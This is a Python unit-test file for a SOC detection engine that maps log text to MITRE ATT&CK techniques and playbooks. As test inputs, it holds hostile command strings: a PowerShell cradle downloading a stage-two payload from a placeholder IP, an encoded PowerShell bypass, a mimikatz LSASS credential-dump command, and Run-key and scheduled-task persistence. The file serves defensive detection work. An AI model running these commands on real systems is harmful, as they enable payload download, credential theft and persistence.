"""
Unit tests for Pure-Python SOC Rule Engine & Incident Playbooks (MITRE ATT&CK Mapping).
"""

import unittest
from core.soc_rules import SOCRule, SOCRuleEngine


class TestSOCRules(unittest.TestCase):

    def setUp(self):
        self.engine = SOCRuleEngine()

    def test_builtin_rules_registered(self):
        """Verify built-in SOC rules for MITRE ATT&CK techniques are loaded."""
        rules = self.engine.list_rules()
        self.assertGreaterEqual(len(rules), 5)
        rule_ids = {r["rule_id"] for r in rules}
        self.assertIn("SOC-T1055-01", rule_ids)  # T1055
        self.assertIn("SOC-T1059-01", rule_ids)  # T1059.001
        self.assertIn("SOC-T1003-01", rule_ids)  # T1003
        self.assertIn("SOC-T1071-01", rule_ids)  # T1071
        self.assertIn("SOC-T1547-01", rule_ids)  # T1547.001

    def test_evaluate_text_process_injection(self):
        """Verify detection of T1055 Process Injection via memory allocation and thread creation."""
        text = "Target invoked VirtualAllocEx and WriteProcessMemory before calling CreateRemoteThread"
        matches = self.engine.evaluate_text(text, source_label="memory_dump")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1055", matched_techniques)
        t1055 = [m for m in matches if m["technique_id"] == "T1055"][0]
        self.assertEqual(t1055["severity"], "Critical")
        self.assertIn("playbook", t1055)
        self.assertIn("containment", t1055["playbook"])

    def test_evaluate_text_powershell_execution(self):
        """Verify detection of T1059.001 PowerShell obfuscation / execution bypass."""
        text = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand JABh..."
        matches = self.engine.evaluate_text(text, source_label="process_tree")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1059.001", matched_techniques)

    def test_evaluate_text_credential_dumping(self):
        """Verify detection of T1003 OS Credential Dumping targeting LSASS."""
        text = "Invoked sekurlsa::logonpasswords against lsass.exe process memory"
        matches = self.engine.evaluate_text(text, source_label="edr_alert")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1003", matched_techniques)
        t1003 = [m for m in matches if m["technique_id"] == "T1003"][0]
        self.assertEqual(t1003["severity"], "Critical")

    def test_evaluate_text_c2_traffic(self):
        """Verify detection of T1071 Application Layer Protocol C2 beaconing."""
        text = "powershell (New-Object Net.WebClient).DownloadString('http://198.51.100.24/stage2')"
        matches = self.engine.evaluate_text(text, source_label="network_flow")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1071", matched_techniques)

    def test_evaluate_text_persistence_run_keys(self):
        """Verify detection of T1547.001 Boot or Logon Autostart Execution persistence."""
        text = "Added registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
        matches = self.engine.evaluate_text(text, source_label="registry_trace")
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1547.001", matched_techniques)

    def test_evaluate_binary_triage_integration(self):
        """Verify SOC engine evaluation over structured binary triage findings."""
        triage_mock = {
            "evidence_chain": [
                "Matched suspicious API: VirtualAllocEx",
                "Matched suspicious API: WriteProcessMemory",
                "[IOC PERSISTENCE] @ 0x00000400: Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
            ],
            "ioc_strings": {
                "ips_detected": ["198.51.100.24"],
                "urls_detected": ["http://c2-domain.com/beacon"],
            },
        }
        matches = self.engine.evaluate_binary_triage(triage_mock)
        matched_techniques = {m["technique_id"] for m in matches}
        self.assertIn("T1055", matched_techniques)
        self.assertIn("T1547.001", matched_techniques)
        self.assertIn("T1071", matched_techniques)

    def test_playbook_retrieval(self):
        """Verify retrieving playbooks by rule ID or technique ID."""
        pb1 = self.engine.get_playbook("SOC-T1055-01")
        self.assertIsNotNone(pb1)
        self.assertEqual(pb1["playbook_id"], "PB-T1055")
        self.assertIn("containment", pb1)
        self.assertIn("remediation", pb1)

        pb2 = self.engine.get_playbook("T1003")
        self.assertIsNotNone(pb2)
        self.assertEqual(pb2["playbook_id"], "PB-T1003")

        # Unknown returns None
        self.assertIsNone(self.engine.get_playbook("UNKNOWN-999"))

    def test_custom_rule_registration(self):
        """Verify custom SOCRule registration and evaluation."""
        custom_rule = SOCRule(
            rule_id="SOC-CUSTOM-001",
            title="Suspicious Scheduled Task Creation",
            technique_id="T1053.005",
            technique_name="Scheduled Task/Job: Scheduled Task",
            severity="Medium",
            patterns=[r"schtasks\s+/create", r"Register-ScheduledTask"],
            description="Detects creation of scheduled tasks for persistence or execution.",
        )
        self.engine.register_rule(custom_rule)
        matches = self.engine.evaluate_text("schtasks /create /sc onlogon /tn MyTask /tr calc.exe")
        matched_ids = {m["rule_id"] for m in matches}
        self.assertIn("SOC-CUSTOM-001", matched_ids)


if __name__ == "__main__":
    unittest.main()
